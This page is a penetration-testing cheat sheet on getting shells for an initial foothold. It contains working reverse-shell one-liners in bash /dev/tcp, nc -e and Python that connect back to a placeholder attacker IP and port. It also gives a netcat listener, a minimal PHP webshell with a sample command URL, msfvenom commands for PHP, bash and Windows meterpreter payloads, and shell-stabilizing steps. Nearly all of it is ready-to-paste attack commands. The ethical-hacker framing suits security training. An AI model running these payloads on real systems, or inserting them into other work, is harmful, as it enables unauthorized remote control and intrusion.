---
title: "Shells"
ShowToc: true
TocOpen: false
build:
  list: never
---

[← Cheat Sheets](../) · {{< download "/dl/cheatsheets/04_shells-for-the-ethical-hacker.md" "Download this sheet (.md)" >}}


> How to establish an initial foothold.

## Shell Types

| shell type | who listens | who connects | notes |
| ---------- | ----------- | ------------ | ----- |
| **reverse** | attacker | target → attacker | the standard; outbound from the target looks less suspicious |
| **bind** | target | attacker → target | needs an inbound-reachable target port |
| **webshell** | — | — | half-interactive; run commands via a web app, output on the page |

## Catching a Reverse Shell

```
nc -lnvp <port>
```

| flag | usage |
| ---- | ----- |
| `-l` | listen for an incoming connection |
| `-n` | no DNS resolution |
| `-v` | verbose |
| `-p <port>` | port to listen on |

> ports 0-1023 are root user only; use 1024 or higher

## Creating Reverse Shells

> best resource: **https://revshells.com** — set your IP + port, pick a payload,
> copy-paste. Offers reverse / bind / webshell / msfvenom variants and a matching listener.

| one-liner (run on target) | note |
| ------------------------- | ---- |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | bash reverse shell |
| `nc <ip> <port> -e /bin/bash` | nc with `-e` (if supported) |
| `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'` | python reverse shell |

> if one variant silently fails, try another — behavior differs by target shell/tooling.

## Webshells

| item | usage |
| ---- | ----- |
| `<?php system($_GET['cmd']); ?>` | minimal PHP webshell (worth memorizing) |
| `http://<target>/<path>/shell.php?cmd=whoami` | invoke it |
| `webshells` | list bundled webshells (`/usr/share/webshells/`) |

> remember to URL encode when injecting shells through a URL

## msfvenom (payload generator)

```
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>
```

| example | note |
| ------- | ---- |
| `-p php/meterpreter_reverse_tcp ... -f raw -o shell.php` | PHP meterpreter |
| `-p cmd/unix/reverse_bash ... -f raw -o shell.sh` | bash reverse |
| `-p windows/meterpreter/reverse_tcp ... -f exe -o shell.exe` | Windows exe |

> `LHOST`/`LPORT` = your attacker IP/port (the listener). Shines for Windows payloads.

## Stabilizing a Shell (Linux)

> a raw `nc` shell is not a TTY: no line editing, no history, CTRL+C kills it.
> upgrade it to a usable (PTY) shell:

| step | where | command |
| ---- | ----- | ------- |
| 1. spawn PTY | target | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| (alt) | target | `perl -e 'exec "/bin/bash";'` |
| 2. background | attacker | press `CTRL+Z` |
| 3. raw mode + resume | attacker | `stty raw -echo; fg` then Enter |
| 4. set terminal type | target | `export TERM=xterm-256color` |

## Stabilizing a Shell (Windows)

> Windows shells are flaky; wrap your listener with `rlwrap` for history/line editing.

```
sudo apt install rlwrap -y
rlwrap nc -lnvp <port>
```
